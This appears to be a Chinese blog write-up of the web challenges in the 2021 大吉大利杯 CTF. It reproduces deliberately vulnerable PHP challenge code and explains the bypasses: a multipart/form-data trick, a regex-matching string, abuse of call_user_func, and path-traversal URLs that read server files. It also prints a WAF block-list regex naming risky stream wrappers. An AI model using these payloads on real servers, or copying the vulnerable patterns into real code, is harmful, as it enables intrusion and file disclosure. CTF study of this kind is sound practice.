@@ -1,0 +1,333 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="大吉大利杯web部分wp 菜炸了，一部分题是自己做出来的，一部分题是看wp复现的 spaceman php代码审计，源码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19"><title>2021大吉大利杯</title>
+<link rel=canonical href=https://k1te.cn/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="2021大吉大利杯"><meta property='og:description' content="大吉大利杯web部分wp 菜炸了，一部分题是自己做出来的，一部分题是看wp复现的 spaceman php代码审计，源码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19"><meta property='og:url' content='https://k1te.cn/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/'><meta property='og:site_name' content="k1te's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='wp'><meta property='article:tag' content='ctf'><meta property='article:published_time' content='2021-01-24T17:01:00+08:00'><meta property='article:modified_time' content='2021-01-24T17:01:00+08:00'><meta name=twitter:title content="2021大吉大利杯"><meta name=twitter:description content="大吉大利杯web部分wp 菜炸了，一部分题是自己做出来的，一部分题是看wp复现的 spaceman php代码审计，源码： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hub6c78dfe06f1a54a6fd33c0996ec5489_36353_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎯</span></figure><div class=site-meta><h1 class=site-name><a href=/>k1te's blog</a></h1><h2 class=site-description>Whereof one cannot speak, thereof one must be silent.</h2></div></header><ol class=menu-social><li><a href=https://github.com/zk1te target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#spaceman>spaceman</a><ol><li><a href=#phpinput-与-_post>php://input 与 $_POST</a></li><li><a href=#反序列化>反序列化</a></li></ol></li><li><a href=#veryphp>veryphp</a><ol><li><a href=#phpinput-与-_post-1>php://input 与 $_POST</a></li><li><a href=#正则>正则</a></li><li><a href=#secretnumber>$SecretNumber</a></li><li><a href=#call_user_func>call_user_func</a></li></ol></li><li><a href=#虎山行revenge>虎山行&amp;revenge</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E9%A2%98%E8%A7%A3/>题解</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/>2021大吉大利杯</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jan 24, 2021</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 5 分钟</time></div></footer></div></header><section class=article-content><h1 id=大吉大利杯web部分wp>大吉大利杯web部分wp</h1><p>菜炸了，一部分题是自己做出来的，一部分题是看wp复现的</p><h2 id=spaceman>spaceman</h2><p>php代码审计，源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>spaceman</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span><span class=nv>$password</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>=</span> <span class=nv>$username</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=nv>$password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>===</span><span class=s1>&#39;ctfshowvip&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>include</span><span class=p>(</span><span class=s2>&#34;flag.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>    
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span>
+</span></span><span class=line><span class=cl>        <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;wrong password&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$string</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;ctfshowup&#39;</span><span class=p>,</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>,</span><span class=nv>$string</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$str</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/\_|\.|\]|\[/is&#39;</span><span class=p>,</span><span class=nv>$str</span><span class=p>)){</span>            
+</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;I am sorry but you have to leave.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>extract</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$ser</span> <span class=o>=</span> <span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>spaceman</span><span class=p>(</span><span class=nv>$user_name</span><span class=p>,</span><span class=nv>$pass_word</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl><span class=nv>$test</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$ser</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=phpinput-与-_post>php://input 与 $_POST</h3><p>先说说php://input传参的问题，当直接post<code>str=xxxx</code>的时候可以直接传入变量str，但是当post<code>str=xxx&amp;pass_word=xxx</code>的时候，php://input会将这一整串赋值给str，因为其中有下划线，所以无法绕过，测试如下：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210124173439968.png loading=lazy alt=image-20210124173439968></p><p>上网查找相关资料，发现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1.Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2.只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。
+</span></span></code></pre></td></tr></table></div></div><p>也就是说，Coentent-Type为multipart/form-data时，php://input为空而$_POST不为空，从而绕过该正则。至于如何传呢，我是使用插件<code>Tabbed Postman - REST Client</code>，其他的方法我也不会（菜）</p><h3 id=反序列化>反序列化</h3><p>刚开始觉得filter函数吞掉了俩字符，会导致反序列无法正常进行，后面发现，这个filter函数过滤了个寂寞。。。</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210124175714492.png loading=lazy alt=image-20210124175714492></p><p>正常情况下压根儿就没有<code>ctfshowup</code>给他进行替换。。。所以直接以form-data，post一个pass_word=ctfshowvip即可，user_name随便填</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210124175902807.png loading=lazy></p><p>可能是出题没想到这个非预期吧</p><h2 id=veryphp>veryphp</h2><p>也是一道php代码审计，源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;config.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>qwq</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Access Denied!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=k>function</span> <span class=nf>oao</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>show_source</span><span class=p>(</span><span class=s2>&#34;config.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$str</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/\`|\_|\.|%|\*|\~|\^|\&#39;|\&#34;|\;|\(|\)|\]|g|e|l|i|\//is&#39;</span><span class=p>,</span><span class=nv>$str</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;I am sorry but you have to leave.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>extract</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$shaw_root</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/&#39;</span><span class=p>,</span> <span class=nv>$shaw_root</span><span class=p>)</span><span class=o>&amp;&amp;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$shaw_root</span><span class=p>)</span><span class=o>===</span><span class=mi>29</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$hint</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Almost there.&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;&lt;br&gt;&#34;</span><span class=o>.</span><span class=s2>&#34;Input correct parameters&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$ans</span><span class=o>===</span><span class=nv>$SecretNumber</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;&lt;br&gt;&#34;</span><span class=o>.</span><span class=s2>&#34;Congratulations!&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$my_ans</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=phpinput-与-_post-1>php://input 与 $_POST</h3><p>传参问题与上一题一样，这里就不再赘述了。</p><h3 id=正则>正则</h3><p>绕了半天不知道这个正则想匹配些啥（可能是我太菜了），不过最后总算是绕过去了，学习正则的话可以参考这篇文章：<a class=link href=https://deerchao.cn/tutorials/regex/regex.htm target=_blank rel=noopener>正则表达式30分钟入门教程</a>，最后给出$shaw_root的值：<code>-a9&lt;b>>>>>abcaaaaaaaa.php@Rr.</code>。</p><h3 id=secretnumber>$SecretNumber</h3><p>绕过正则之后得到一个hint：<code>Here is a hint : md5("shaw".($SecretNumber)."root")==166b47a5cb1ca2431a0edfcef200684f && strlen($SecretNumber)===5</code>，感觉出题人是想让我们根据这个hint把SecretNumber爆出来，但是这里两个变量都可控，应该是被非预期了。。。</p><h3 id=call_user_func>call_user_func</h3><p>又是一个变量的call_user_func。。。上回我盯着phpinfo看了大半天。。。这次也是先传入一个phpinfo找找，但是并没发现什么可疑的东西，然后又搜了下flag，也没找到。然后这时候想起最前面的qwq类以及其静态方法，刚开始直接传入my_ans=oao，但是发现行不通。。。于是去Google了一下call_user_func如何调用类的静态方法：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210125094308165.png loading=lazy alt=image-20210125094308165></p><p>因为oao函数没有参数，所以可以传入my_ans数组从而调用该静态方法，最后payload：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210125094459116.png loading=lazy alt=image-20210125094459116></p><h2 id=虎山行revenge>虎山行&amp;revenge</h2><p>这题真的不会，之前也没有做过phar的反序列化，基本上都是靠着各种wp和资料复现的。</p><p>打开之后有个hint：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210125124151116.png loading=lazy alt=image-20210125124151116></p><p>访问之后：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210125124217163.png loading=lazy alt=image-20210125124217163></p><p>安装看看：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210125124326307.png loading=lazy alt=image-20210125124326307></p><p>假装自己扫了一下目录：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210125125220618.png loading=lazy alt=image-20210125125220618></p><p>拿到源码之后先拿d盾扫一下：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210125184218268.png loading=lazy alt=image-20210125184218268></p><p>好像没啥用，后面同学和我说可以传file直接目录穿越（审计源码能力太差了）：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210126093915671.png loading=lazy alt=image-20210126093915671></p><p>然后打开：/ctfshowsecretfilehh：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210126094004259.png loading=lazy alt=image-20210126094004259></p><p>利用<code>/mc-admin/page-edit.php?file=../../../../../../../var/www/html/ctfshowsecretfilehh/waf.php</code>读取waf.php源码:</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210126114719848.png loading=lazy alt=image-20210126114719848></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$file</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&#34;</span><span class=p>,</span><span class=nv>$file</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;姿势太简单啦，来一点骚的？！&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>再用<code>/mc-admin/page-edit.php?file=../../../upload.php</code>读取upload.php的源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>// 允许上传的图片后缀
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$allowedExts</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;gif&#34;</span><span class=p>,</span> <span class=s2>&#34;jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;png&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$temp</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=c1>// echo $_FILES[&#34;file&#34;][&#34;size&#34;];
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$extension</span> <span class=o>=</span> <span class=nx>end</span><span class=p>(</span><span class=nv>$temp</span><span class=p>);</span>     <span class=c1>// 获取文件后缀名
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(((</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/gif&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/jpeg&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>||</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;type&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;image/png&#34;</span><span class=p>))</span>
